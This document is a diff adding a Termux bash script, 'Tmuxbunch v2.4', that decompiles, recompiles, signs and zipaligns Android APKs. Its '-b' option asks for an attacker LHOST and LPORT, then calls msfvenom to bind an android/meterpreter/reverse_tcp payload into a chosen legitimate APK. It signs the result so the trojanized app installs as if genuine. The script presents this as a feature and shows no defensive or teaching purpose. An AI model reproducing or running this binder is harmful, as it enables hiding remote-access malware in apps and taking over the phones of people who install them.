@@ -1,0 +1,198 @@
+#!/data/data/com.termux/files/usr/bin/bash
+unset LD_PRELOAD
+dir=$HOME/Tmux-Bunch
+subs="which file ? Enter number of choice or 'x' to exit"
+esit="are you sure ? press ENTER to exit"
+return="ENTER to exit"
+#colors
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+#################
+
+#################
+if [ "${1}" = "-h" ]
+then
+printf "$yellow  \n Tmuxbunch v2.4\n\n$blue  -d /path/to/apkname.apk For decompiling\n  -r For recompiling\n  -s For signing\n  -b For binding payload\n  -z For zipalign\n$reset"
+
+
+#################
+# Bind
+#################
+elif [ "${1}" = "-b" ]
+then
+#cp ${2} $dir/binder
+#mv $dir/binder/$OUTPUT $HOME/metasploit-framework
+echo -e "$purple [*] Please enter following details :-"
+echo " [*] LHOST :-"
+read lhost
+echo " [*] LPORT :-"
+read lport
+echo " [*] ENTER THE NAME YOU WANT TO GIVE FOR THE FINAL APP"
+read output12
+echo
+echo -e "$blue [*] Please wait while binding.......🕜"
+echo
+cd $HOME/metasploit-framework
+./msfvenom -x ${2} -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
+echo -e "$green signing apk ......."
+mv $dir/unsign/output.apk $dir/unsign/$output12.apk
+sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$output12.apk $dir/embout/$output12.apk
+rm $dir/unsign/$output12.apk
+echo
+echo -e "$cyan We will met again :D , have a payload day..! 📢"
+echo
+echo -e "Check embout folder for binded payload $reset"
+
+###############
+#decompile
+###############
+elif [ "${1}" = "-d" ]
+then
+cp ${2} $dir/decompiler
+echo
+echo
+echo -e "$yellow Decompiling an apk"
+echo
+echo -e "$green press ENTER to continue"
+echo
+read o
+cd $dir/decompiler
+ls | cat -n
+echo
+echo
+echo -e "$blue $subs"
+read choice
+if [ $choice = 'x' ] ; then
+echo -e "$red $esit"
+read e
+exit
+else
+cd $dir/decompiler
+OUTPUT=`ls | sed -n $choice'p'`
+sh $dir/.apktool d $dir/decompiler/$OUTPUT -o $dir/recompiler/$OUTPUT
+echo
+echo
+echo
+echo -e "$blue ____________________________________"
+echo
+echo -e "$yellow Decompiled files in 'recompiler' folder. You can now play with apk source code"
+echo
+echo -e "$reset"
+fi
+###############
+# recompile
+##############
+elif [ "${1}" = "-r" ]
+then
+echo
+echo
+echo -e "$yellow This will compile the source code"
+echo " The app can't be install until you sign it"
+echo
+echo -e "$blue press ENTER to continue"
+echo
+read h
+cd $dir/recompiler
+ls | cat -n
+echo
+echo
+echo -e "$yellow $subs"
+read choice
+if [ $choice = 'x' ]
+then
+echo -e "$red $esit"
+read p
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+sh $dir/.apktool b --aapt $dir/.bunch/openjdk/bin/aapt $dir/recompiler/$OUTPUT -o $dir/unsign/$OUTPUT
+echo
+echo
+echo
+echo -e "$green ________________________________________"
+echo
+echo -e "$blue recompiled apk in 'unsign' folder. Sign apk before installing"
+echo
+echo -e "$reset"
+fi
+###########################
+# sign
+#####################
+elif [ "${1}" = "-s" ]
+then
+echo
+echo
+echo
+echo -e "$yellow Sign the apk"
+echo
+echo " App will be ready to install after you sign it"
+echo
+echo -e "$greenpress ENTER to continue"
+echo
+read n
+cd $dir/unsign
+ls | cat -n
+echo
+echo
+echo -e "$yellow $subs"
+read choice
+if [ $choice = 'x' ] ; then
+echo -e "$red $esit"
+read d
+exit
+else
+echo -e "$green signing apk ......."
+OUTPUT=`ls | sed -n $choice'p'`
+sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$OUTPUT $dir/sign/signed_$OUTPUT
+echo
+echo
+echo -e "$blue _______________________________________"
+echo
+echo -e "$green signed apk in 'sign' folder"
+echo
+echo -e "$reset"
+fi
+#################
+# Zipalign
+#################
+elif [ "${1}" = "-z" ]
+then
+cp ${2} $dir/zipalign
+echo
+echo
+echo
+#echo -e "$yellow place apk to be zipaligned in 'Zipalign' folder"
+echo
+echo -e "$green press ENTER to continue"
+read lokesh
+cd $dir/zipalign
+ls | cat -n
+echo
+echo
+echo -e "$blue $subs"
+read choice
+if [ $choice = 'x'] ; then
+echo -e "$red $esit"
+read pandey
+exit
+else
+OUTPUT=`ls | sed -n $choice'p'`
+sh $dir/.zzipalign 4 $dir/zipalign/$OUTPUT $dir/zipaligned_$OUTPUT
+echo
+echo
+echo -e "$blue________________________________________"
+echo
+echo -e "$yellow zipaligned apk in 'zipalign' folder"
+echo
+echo -e "$reset"
+fi
+#################
+else
+printf "$red invalid option ${1}\n$green try 'tbunch -h' for more information\n $reset"
+fi
+
